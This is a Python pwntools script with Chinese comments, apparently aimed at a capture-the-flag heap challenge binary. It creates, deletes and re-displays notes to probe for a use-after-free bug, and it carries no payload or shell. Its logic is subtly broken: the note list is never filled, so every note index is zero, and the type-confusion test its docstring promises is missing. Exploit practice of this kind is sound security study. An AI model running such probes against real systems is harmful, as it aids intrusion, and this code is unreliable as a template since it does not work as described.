#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
针对性漏洞利用脚本
基于静态分析发现的UAF和类型混淆漏洞
"""

from pwn import *
import time
import struct

class TargetedExploit:
    def __init__(self, binary_path):
        self.binary_path = binary_path
        self.io = None
        self.notes = []
        
    def connect(self):
        """连接到程序"""
        self.io = process(self.binary_path)
        self.io.recvuntil(b"Welcome to the All-Pwn-Red-Book App!")
        print("[+] 已连接到程序")
    
    def create_note(self, note_type, content):
        """创建笔记"""
        self.io.sendline(b"1")
        self.io.recvuntil(b"NOTE TYPE")
        self.io.sendline(str(note_type).encode())
        self.io.recvuntil(b"Please enter note content:")
        self.io.sendline(content.encode())
        
        response = self.io.recvline()
        print(f"[+] 创建笔记类型{note_type}: {response}")
        return len(self.notes)
    
    def delete_note(self, note_num):
        """删除笔记"""
        self.io.sendline(b"5")
        self.io.recvuntil(b"Note number")
        self.io.sendline(str(note_num).encode())
        
        response = self.io.recvuntil(b"Pick your main character move")
        print(f"[+] 删除笔记{note_num}: {response}")
    
    def display_note(self, note_num):
        """显示笔记内容"""
        self.io.sendline(b"3")
        self.io.recvuntil(b"Note number")
        self.io.sendline(str(note_num).encode())
        
        try:
            response = self.io.recvuntil(b"Pick your main character move")
            print(f"[+] 显示笔记{note_num}: {response}")
            return response
        except:
            print(f"[-] 显示笔记{note_num}失败，可能触发崩溃")
            return None
    
    def test_uaf_vulnerability(self):
        """测试UAF漏洞"""
        print("\n=== 测试UAF漏洞 ===")
        
        # 创建多个不同类型的笔记
        note1 = self.create_note(1, "CheckinNotes content")
        note2 = self.create_note(2, "ProductReviews content")  
        note3 = self.create_note(3, "ConfessionPosts content")
        
        # 删除第一个笔记
        self.delete_note(note1)
        
        # 尝试访问已删除的笔记 - 可能触发UAF
        print("[+] 尝试访问已删除的笔记...")
        response = self.display_note(note1)
        
        if response and b"Note Content:" in response:
            print("[!] 可能发现UAF漏洞 - 能够访问已删除的笔记")
            return True
        
        return False
    
    def run_targeted_exploit(self):
        """运行针对性漏洞利用"""
        print("开始针对性漏洞利用测试...")
        
        try:
            self.connect()
            
            # 运行UAF测试
            uaf_found = self.test_uaf_vulnerability()
            
            print("\n=== 漏洞测试结果 ===")
            print(f"UAF漏洞: {'发现' if uaf_found else '未发现'}")
            
            if uaf_found:
                print("\n[!] 发现UAF漏洞，建议进一步分析")
            
        except Exception as e:
            print(f"错误: {e}")
        finally:
            if self.io:
                self.io.close()

def main():
    import sys
    
    if len(sys.argv) != 2:
        print("用法: python3 targeted_exploit.py <binary_path>")
        sys.exit(1)
    
    binary_path = sys.argv[1]
    exploit = TargetedExploit(binary_path)
    exploit.run_targeted_exploit()

if __name__ == "__main__":
    main()
